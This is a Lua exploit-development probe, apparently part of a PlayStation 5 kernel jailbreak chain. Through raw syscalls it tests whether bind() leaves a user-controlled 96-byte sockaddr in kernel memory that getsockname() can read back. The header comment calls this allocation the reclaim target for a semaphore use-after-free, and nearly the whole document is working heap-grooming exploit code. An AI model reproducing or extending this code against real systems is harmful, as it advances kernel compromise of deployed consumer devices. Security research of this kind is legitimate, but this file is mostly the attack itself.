-- CRASH_CLASS: LOW
-- PROBE 840a: does bind() keep a user-filled 0x60-byte sockaddr we can read back?
--
-- bind(104) mallocs namelen bytes and copyins the sockaddr verbatim.  If the
-- AF_UNIX address persists in the PCB, getsockname() returns those same bytes,
-- which gives (a) a 96-byte kernel allocation fully controlled from userland and
-- (b) an oracle that shows any later kernel write into it.  That is the reclaim
-- target the osem destroy-while-waiting use-after-free needs.

print("=== PROBE 840a: bind sockaddr chunk ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end

local sc_socket = make_syscall(97)
local sc_bind   = make_syscall(104)
local sc_getsockname = make_syscall(32)
local sc_close  = make_syscall(6)

local fd = sc_socket(uint64(1), uint64(1), uint64(0))   -- AF_UNIX, SOCK_STREAM
print(string.format("[A] socket(AF_UNIX,SOCK_STREAM) fd=%s", hx(fd)))

-- one page holds both the outbound sockaddr and the read-back buffer
local sa  = memory.alloc(0x1000)
local out = memory.alloc(0x1000)
local outlen = memory.alloc(8)

local function put_sa(base, len, fill, path)
    for i = 0, len - 1 do memory.write_byte(base + i, fill) end
    memory.write_byte(base, len)      -- sa_len
    memory.write_byte(base + 1, 1)    -- AF_UNIX
    local p = path or "/tmp/p"
    for i = 1, #p do memory.write_byte(base + 1 + i, string.byte(p, i)) end
    memory.write_byte(base + 1 + #p + 1, 0)
end

-- B: a 0x60-byte sockaddr_un
put_sa(sa, 0x60, 0x41, "/tmp/ps5sem0")
local b = sc_bind(fd, uint64(to_num(sa)), uint64(0x60))
print(string.format("[B] bind(len=60) = %s", hx(b)))

-- C: read it back
memory.write_dword(outlen, 0x80)
local c = sc_getsockname(fd, uint64(to_num(out)), uint64(to_num(outlen)))
local gotlen = to_num(memory.read_dword(outlen))
print(string.format("[C] getsockname queued ret=%s len=%X", hx(c), gotlen))
local function dump(tag, base, n)
    local s = {}
    for i = 0, n - 1 do s[#s + 1] = string.format("%02X", to_num(memory.read_byte(base + i))) end
    print(string.format("%s %s", tag, table.concat(s, " ")))
end
dump("[C] bytes 0..0F:", out, 16)
dump("[C] bytes 40..5F:", out + 0x40, 0x20)

-- D: short path, len 0x10
put_sa(sa, 0x10, 0x42, "/tmp/q")
local d = sc_bind(fd, uint64(to_num(sa)), uint64(0x10))
print(string.format("[D] bind(len=10) = %s", hx(d)))

-- E: second socket, second 0x60 chunk, distinct bytes per offset
local fd2 = sc_socket(uint64(1), uint64(1), uint64(0))
local sa2 = memory.alloc(0x1000)
for i = 0, 0x5F do memory.write_byte(sa2 + i, 0x60 + (i % 0x20)) end
memory.write_byte(sa2, 0x60)
memory.write_byte(sa2 + 1, 1)
local e = sc_bind(fd2, uint64(to_num(sa2)), uint64(0x60))
print(string.format("[E] socket2 fd=%s bind(len=60) = %s", hx(fd2), hx(e)))
local out2 = memory.alloc(0x1000)
local outlen2 = memory.alloc(8)
memory.write_dword(outlen2, 0x80)
local f = sc_getsockname(fd2, uint64(to_num(out2)), uint64(to_num(outlen2)))
print(string.format("[F] getsockname2 ret=%s len=%X", hx(f), to_num(memory.read_dword(outlen2))))
local same = 1
for i = 0, 0x5F do
    if to_num(memory.read_byte(out2 + i)) ~= to_num(memory.read_byte(sa2 + i)) then same = 0 end
end
print(string.format("[F] readback matches input: %s", tostring(same == 1)))

-- G: a 0x58 and a 0x68 length, to map which lengths are accepted
for _, L in ipairs({0x58, 0x68, 0x6A, 0x6B}) do
    local fdx = sc_socket(uint64(1), uint64(1), uint64(0))
    local sax = memory.alloc(0x1000)
    for i = 0, L - 1 do memory.write_byte(sax + i, 0x43) end
    memory.write_byte(sax, L)
    memory.write_byte(sax + 1, 1)
    local r = sc_bind(fdx, uint64(to_num(sax)), uint64(L))
    print(string.format("[G] len=%X ret=%s", L, hx(r)))
    sc_close(fdx)
end

print("[Z] alive=true")
print("=== PROBE 840a COMPLETE ===")
